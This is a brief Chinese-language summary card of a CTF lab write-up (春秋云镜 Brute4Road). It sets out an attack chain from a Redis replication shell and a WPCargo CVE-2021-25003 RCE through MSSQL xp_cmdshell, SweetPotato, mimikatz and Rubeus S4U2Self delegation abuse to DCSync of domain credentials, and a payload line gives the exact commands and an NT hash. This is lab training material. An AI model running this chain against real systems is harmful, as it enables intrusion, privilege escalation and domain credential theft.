---
title: "春秋云镜——Brute4Road Writeup"
category: web
tags: ["春秋云镜靶场", "web", "Redis主从复制", "SUID提权", "base64", "CVE-2021-25003"]
signals: ["春秋云镜靶场 2022", "Redis主从复制", "SUID提权", "base64", "CVE-2021-25003", "WPCargo RCE", "MSSQL xpcmdshell", "SweetPotato", "约束性委派攻击", "rce", "Brute4Road", "Redis", "SUID", "WPCargo"]
difficulty: medium
source: "https://www.ctfiot.com/65358.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 春秋云镜——Brute4Road Writeup

> 赛事：春秋云镜靶场 2022 | 方向：web | 难度：medium

## 一句话总结

春秋云镜Brute4Road：Redis主从+SUID+WPCargo RCE+约束性委派Rubeus S4U2Self+DCSync

## 攻击链

1. Redis主从复制getshell→base64 SUID读flag1→内网frp代理→wpscan扫到WPCargo 6.x→CVE-2021-25003未授权RCE→MSSQL爆破ElGNkOiC→xpcmdshell+Ole Automation Procedures→SweetPotato提权system→mimikatz导出MSSQLSERVER$ NT hash→Rubeus asktgt→S4U2Self申请LDAP票据→DCSync导出域管→wmiexec登录DC

## 关键 payload

```
exploit/linux/redis/redis_replication_cmd_exec;base64 "/home/redis/flag/flag01";CVE-2021-25003 wpcargo barcode.php;SweetPotato.exe -a;Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352;kerberos::golden /ptt;lsadump::dcsync /user:Administrator
```

## 经验教训

域内机器账户+约束性委派可被Rubeus S4U2Self扩展代表域管访问LDAP服务导出域内凭据

## 标签

Redis主从复制、SUID提权、base64、CVE-2021-25003、WPCargo RCE、MSSQL xpcmdshell、SweetPotato、约束性委派攻击、Rubeus S4U2Self、DCSync

## 参考来源

- https://www.ctfiot.com/65358.html
- 原文件：春秋云镜——Brute4Road_Writeup.full.md
